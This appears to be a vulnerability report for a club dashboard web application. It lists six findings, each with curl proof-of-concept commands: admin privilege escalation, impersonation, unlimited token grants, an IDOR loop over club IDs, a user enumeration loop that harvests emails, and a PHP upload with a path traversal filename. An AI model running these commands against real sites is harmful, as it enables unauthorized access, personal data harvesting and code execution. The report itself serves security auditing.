privilege_escalation.title: Admin Role Assignment (Privilege Escalation)
privilege_escalation.description: Any admin can promote any user to admin status without additional verification
privilege_escalation.poc:
# Prerequisites: Valid admin session or API key
# Step 1: Find target user email
curl 'https://club-dashboard.com/api/admin/users/search?q=victim' \
  -H 'Authorization: Bearer ADMIN_API_KEY'

# Step 2: Promote user to admin
curl -X POST 'https://club-dashboard.com/api/admin/administrators' \
  -H 'Authorization: Bearer ADMIN_API_KEY' \
  -H 'Content-Type: application/json' \
  -d '{"email": "victim@example.com"}'

# Result: User becomes admin with full system access
privilege_escalation.impact: Complete system compromise, all data accessible

admin_impersonation.title: Admin User Impersonation
admin_impersonation.description: Admins can login as any non-admin user without consent
admin_impersonation.poc:
# Prerequisites: Admin session
# Step 1: Find target user ID
curl 'https://club-dashboard.com/api/admin/users' \
  -H 'Cookie: session=admin_session_cookie'

# Step 2: Login as target user
curl -X POST 'https://club-dashboard.com/api/admin/login-as-user/123' \
  -H 'Cookie: session=admin_session_cookie' \
  -H 'Content-Type: application/json'

# Result: Session now belongs to target user
# Admin can access user's private data, make changes on their behalf

token_manipulation.title: Financial Token Manipulation
token_manipulation.description: Unlimited token grants without proper financial controls
token_manipulation.poc:
# Prerequisites: Admin API key with clubs:write scope
# Step 1: Create or identify target club
curl -X POST 'https://club-dashboard.com/api/admin/clubs' \
  -H 'Authorization: Bearer ADMIN_API_KEY' \
  -H 'Content-Type: application/json' \
  -d '{"name": "Exploit Club", "description": "Test", "location": "Test"}'

# Step 2: Grant massive token amounts  
curl -X POST 'https://club-dashboard.com/api/v1/admin/clubs/1/tokens/grant' \
  -H 'Authorization: Bearer ADMIN_API_KEY' \
  -H 'Content-Type: application/json' \
  -d '{"amount": 99999, "description": "Financial exploitation"}'

# Result: Club receives 99,999 tokens ($999.99 value)
# Can be repeated for unlimited financial gain

idor_club_access.title: Club Resource IDOR
idor_club_access.description: Access any club's private resources by manipulating club_id
idor_club_access.poc:
# Prerequisites: Valid user session
# Step 1: Access own club resources (authorized)
curl 'https://club-dashboard.com/api/clubs/1/posts' \
  -H 'Cookie: session=user_session'

# Step 2: Access other clubs by changing ID (unauthorized)
for club_id in {1..100}; do
  curl "https://club-dashboard.com/api/clubs/$club_id/posts" \
    -H 'Cookie: session=user_session' \
    -s | grep -q "posts" && echo "Club $club_id accessible"
done

# Result: Access to private club data, member lists, posts

user_enumeration.title: User Information Disclosure
user_enumeration.description: Enumerate and access user profiles without authorization
user_enumeration.poc:
# Prerequisites: API key with users:read scope
# Step 1: Enumerate valid user IDs
for user_id in {1..1000}; do
  response=$(curl -s "https://club-dashboard.com/api/v1/users/$user_id" \
    -H 'Authorization: Bearer API_KEY')
  if echo "$response" | grep -q "username"; then
    echo "User $user_id: $(echo "$response" | jq -r '.user.email')"
  fi
done

# Result: Complete user database enumeration
# Exposes emails, names, club memberships, creation dates
user_enumeration.impact: Mass data breach, user enumeration, privacy violation

file_upload_bypass.title: File Upload Security Bypass
file_upload_bypass.description: Potential file upload vulnerabilities and path traversal
file_upload_bypass.poc:
# Prerequisites: Valid user session
# Step 1: Test malicious file upload
curl -X POST 'https://club-dashboard.com/api/upload-screenshot' \
  -H 'Cookie: session=user_session' \
  -F 'screenshot=@malicious.php;type=image/png'

# Step 2: Test path traversal in filename
curl -X POST 'https://club-dashboard.com/api/upload-screenshot' \
  -H 'Cookie: session=user_session' \
  -F 'screenshot=@test.png;filename=../../../malicious.php'

# Potential Results: 
# - File upload to unintended locations
# - Execution of malicious files
# - Directory traversal attacks
file_upload_bypass.impact: Code execution, file system access, path traversal
